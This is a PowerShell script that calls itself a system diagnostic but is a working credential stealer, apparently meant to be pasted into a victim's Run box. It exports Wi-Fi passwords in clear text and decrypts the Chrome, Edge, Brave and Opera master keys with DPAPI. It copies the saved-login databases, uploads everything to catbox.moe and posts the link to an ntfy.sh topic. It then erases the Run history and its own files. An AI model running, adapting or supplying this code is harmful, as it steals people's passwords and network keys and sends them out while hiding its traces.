# --- SYSTEM DIAGNOSTIC / SILENT ---
$t = "data_stwealer_hideen_"

# 1. SILENT LOAD
try {
    Add-Type -AssemblyName System.Security
} catch { exit }

# 2. Workspace Setup
$d = "$env:TEMP\SysCache_$(Get-Random)"; $z = "$env:TEMP\UpdatePkg.zip"
mkdir $d -Force | Out-Null

# 3. Network Config (Silent)
netsh wlan export profile folder=$d key=clear | Out-Null

# 4. Browser Profiles
$browsers = @{
    "CH" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    "ED" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    "BR" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    "OP" = "$env:APPDATA\Opera Software\Opera Stable\Local State"
}

foreach ($b in $browsers.Keys) {
    $p = $browsers[$b]
    if (Test-Path $p) {
        try {
            $json = Get-Content $p -Raw | ConvertFrom-Json
            $eK = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $uK = [System.Security.Cryptography.ProtectedData]::Unprotect($eK[5..($eK.Length-1)], $null, 'CurrentUser')
            [System.BitConverter]::ToString($uK) -replace '-' | Out-File "$d\${b}_key.txt"
            
            $db = $p.Replace("Local State", "Default\Login Data")
            if ($b -eq "OP") { $db = $p.Replace("Local State", "Login Data") }
            
            if (Test-Path $db) {
                Copy-Item $db -Destination "$d\${b}_data.db" -Force -ErrorAction SilentlyContinue
            }
        } catch { continue }
    }
}

# 5. Packaging & Sync
if (Test-Path $d) {
    Add-Type -AssemblyName "System.IO.Compression.FileSystem"
    [System.IO.Compression.ZipFile]::CreateFromDirectory($d, $z)
    
    $l = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$z" https://catbox.moe/user/api.php

    if ($l -like "http*") {
        Invoke-RestMethod -Uri "https://ntfy.sh/$t" -Method Post -Body "Status: Active | Link: $l"
    }
}

# 6. GHOST CLEANUP
# Wipe the Run dialog history so your URL isn't saved in the Win+R box
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

# Delete the stolen files and the zip
Remove-Item -Recurse -Force $d, $z -ErrorAction SilentlyContinue

# Kill the hidden process
exit
